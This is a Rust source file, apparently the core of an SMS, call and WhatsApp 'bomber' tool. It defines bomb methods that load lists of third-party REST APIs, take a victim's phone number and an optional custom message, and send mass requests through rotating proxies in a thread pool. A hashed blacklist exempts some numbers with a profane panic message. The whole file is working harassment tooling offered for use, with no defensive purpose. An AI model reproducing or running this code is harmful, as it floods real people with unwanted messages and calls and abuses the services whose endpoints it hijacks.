use std::collections::HashMap;
use std::fmt::{Display, Formatter};
use std::io::{Error, stdin};

use serde_json::{Map, Number, Value};
use threadpool::ThreadPool;
use uuid::Uuid;

use crate::{BLACKLIST, encode_md5, InfIterator, ProxyType};
use crate::rest_api::RestAPI;

pub trait BombMethod {
    fn name(&self) -> String;

    fn apis(&mut self) -> &mut HashMap<String, RestAPI>;

    fn get_formatting(&self) -> HashMap<String, String>;

    fn load(&mut self, api_json: &Map<String, Value>) -> std::fmt::Result {
        for (key, value) in api_json.get(self.name().as_str()).unwrap_or(&Value::Object(Map::new())).as_object().unwrap().iter() {
            let obj = match value.as_object() {
                None => continue,
                Some(o) => o
            };
            let api = match RestAPI::from_json(obj) {
                Err(_) => continue,
                Ok(a) => a
            };
            let formatting = self.get_formatting();
            self.apis().insert(key.clone(), api.format(&formatting));
        };
        if self.apis().is_empty() {
            return Err(std::fmt::Error);
        }
        Ok(())
    }

    fn input(&mut self) -> Result<(), Error>;

    fn run(&mut self, thread_pool: &ThreadPool, proxy_type: &Option<ProxyType>, iter: &mut InfIterator) -> std::fmt::Result {
        for (key, api) in self.apis().iter() {
            let k = key.clone();
            let a = api.clone();
            let proxy = iter.next();
            let proxy_type = proxy_type.clone();
            thread_pool.execute(move || {
                match a.request(proxy_type, proxy.as_str()) {
                    Ok(r) => println!("Response from {k}: {:?}", r.status()),
                    Err(e) => println!("Error from {k}: {e}")
                }
            });
        }
        Ok(())
    }
}

impl Display for dyn BombMethod {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        Display::fmt(self.name().as_str(), f)
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct SmsCallBomb {
    pub apis: HashMap<String, RestAPI>,
    pub number: String,
    pub sms_type: SmsType,
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub enum SmsType {
    SMS,
    CALL,
    WHATSAPP,
}

impl Display for SmsType {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        match self {
            SmsType::SMS => write!(f, "SMS"),
            SmsType::CALL => write!(f, "CALL"),
            SmsType::WHATSAPP => write!(f, "WHATSAPP")
        }
    }
}

impl SmsCallBomb {
    pub fn new(sms_type: SmsType) -> Self {
        Self {
            apis: HashMap::new(),
            number: String::new(),
            sms_type,
        }
    }
}

impl BombMethod for SmsCallBomb {
    fn name(&self) -> String {
        self.sms_type.to_string().to_ascii_lowercase()
    }

    fn apis(&mut self) -> &mut HashMap<String, RestAPI> {
        &mut self.apis
    }

    fn get_formatting(&self) -> HashMap<String, String> {
        let mut formatting = HashMap::new();
        let random_uuid = format!("{}", Uuid::new_v4());
        let num = self.number.clone();
        formatting.insert("number".to_string(), num);
        formatting.insert("random-uuid".to_string(), random_uuid);
        formatting
    }

    fn input(&mut self) -> Result<(), Error> {
        println!("Enter phone number:");
        stdin().read_line(&mut self.number)?;
        self.number = self.number.trim().to_string();
        let encoded = encode_md5(self.number.as_str());
        if BLACKLIST.contains(&encoded.as_str()) {
            panic!("FUCK YOU")
        }
        println!();
        Ok(())
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct CustomSmsBomb {
    pub apis: HashMap<String, RestAPI>,
    pub number: String,
    pub message: String,
}

impl CustomSmsBomb {
    pub fn new() -> Self {
        Self {
            apis: HashMap::new(),
            number: String::new(),
            message: String::from("\\n"),
        }
    }
}

impl BombMethod for CustomSmsBomb {
    fn name(&self) -> String {
        String::from("custom-message")
    }

    fn apis(&mut self) -> &mut HashMap<String, RestAPI> {
        &mut self.apis
    }

    fn get_formatting(&self) -> HashMap<String, String> {
        let mut formatting = HashMap::new();
        let random_uuid = format!("{}", Uuid::new_v4());
        let num = self.number.clone();
        let msg = self.message.clone();
        formatting.insert("number".to_string(), num);
        formatting.insert("random-uuid".to_string(), random_uuid);
        formatting.insert("message".to_string(), msg);
        formatting
    }

    fn load(&mut self, api_json: &Map<String, Value>) -> std::fmt::Result {
        for (key, value) in api_json.get(self.name().as_str()).unwrap_or(&Value::Object(Map::new())).as_object().unwrap().iter() {
            let obj = match value.as_object() {
                None => continue,
                Some(o) => o
            };
            let api = match RestAPI::from_json(obj) {
                Err(_) => continue,
                Ok(a) => a
            };
            let mut formatting = self.get_formatting();
            let limit = obj.get("message-limit").unwrap_or(&Value::Number(Number::from(0))).as_u64().unwrap_or(0) as usize;
            let msg = formatting.get_mut("message").unwrap();
            if msg.len() > limit {
                *msg = msg[..limit].to_string()
            }
            self.apis().insert(key.clone(), api.format(&formatting));
        };
        if self.apis().is_empty() {
            return Err(std::fmt::Error);
        }
        Ok(())
    }

    fn input(&mut self) -> Result<(), Error> {
        println!("Enter phone number:");
        stdin().read_line(&mut self.number)?;
        self.number = self.number.trim().to_string();
        let encoded = encode_md5(self.number.as_str());
        if BLACKLIST.contains(&encoded.as_str()) {
            panic!("FUCK YOU")
        }
        println!();

        println!("Enter message:");
        let mut msg = String::new();
        stdin().read_line(&mut msg)?;
        self.message.push_str(msg.trim());
        Ok(())
    }
}

pub struct MixBomb {
    pub sms_bomb: SmsCallBomb,
    pub call_bomb: SmsCallBomb,
    pub whatsapp_bomb: SmsCallBomb,
    pub custom_bomb: CustomSmsBomb,
    pub apis: HashMap<String, RestAPI>,
}

impl MixBomb {
    pub fn new() -> Self {
        Self {
            sms_bomb: SmsCallBomb::new(SmsType::SMS),
            call_bomb: SmsCallBomb::new(SmsType::CALL),
            whatsapp_bomb: SmsCallBomb::new(SmsType::WHATSAPP),
            custom_bomb: CustomSmsBomb::new(),
            apis: HashMap::new(),
        }
    }
}

impl BombMethod for MixBomb {
    fn name(&self) -> String {
        String::from("mix-bomb")
    }

    fn apis(&mut self) -> &mut HashMap<String, RestAPI> {
        &mut self.apis
    }

    fn get_formatting(&self) -> HashMap<String, String> {
        HashMap::new()
    }

    fn load(&mut self, api_json: &Map<String, Value>) -> std::fmt::Result {
        self.sms_bomb.load(api_json).ok();
        self.call_bomb.load(api_json).ok();
        self.whatsapp_bomb.load(api_json).ok();
        self.custom_bomb.load(api_json).ok();
        if self.sms_bomb.apis.is_empty() && self.call_bomb.apis.is_empty() && self.whatsapp_bomb.apis.is_empty() && self.custom_bomb.apis.is_empty() {
            return Err(std::fmt::Error);
        }
        for (key, value) in self.sms_bomb.apis.iter() {
            self.apis.insert(key.clone(), value.clone());
        }
        for (key, value) in self.call_bomb.apis.iter() {
            self.apis.insert(key.clone(), value.clone());
        }
        for (key, value) in self.whatsapp_bomb.apis.iter() {
            self.apis.insert(key.clone(), value.clone());
        }
        for (key, value) in self.custom_bomb.apis.iter() {
            self.apis.insert(key.clone(), value.clone());
        }
        Ok(())
    }

    fn input(&mut self) -> Result<(), Error> {
        println!("Enter phone number:");
        let mut number = String::new();
        stdin().read_line(&mut number)?;
        number = number.trim().to_string();
        let encoded = encode_md5(number.as_str());
        if BLACKLIST.contains(&encoded.as_str()) {
            panic!("FUCK YOU")
        }
        println!();

        println!("Enter message:");
        let mut msg = String::new();
        stdin().read_line(&mut msg)?;

        self.sms_bomb.number = number.clone();
        self.call_bomb.number = number.clone();
        self.whatsapp_bomb.number = number.clone();
        self.custom_bomb.number = number.clone();
        self.custom_bomb.message.push_str(msg.trim());
        Ok(())
    }

    fn run(&mut self, thread_pool: &ThreadPool, proxy_type: &Option<ProxyType>, iter: &mut InfIterator) -> std::fmt::Result {
        self.apis.clear();
        self.sms_bomb.run(thread_pool, proxy_type, iter)?;
        self.call_bomb.run(thread_pool, proxy_type, iter)?;
        self.whatsapp_bomb.run(thread_pool, proxy_type, iter)?;
        self.custom_bomb.run(thread_pool, proxy_type, iter)?;
        Ok(())
    }
}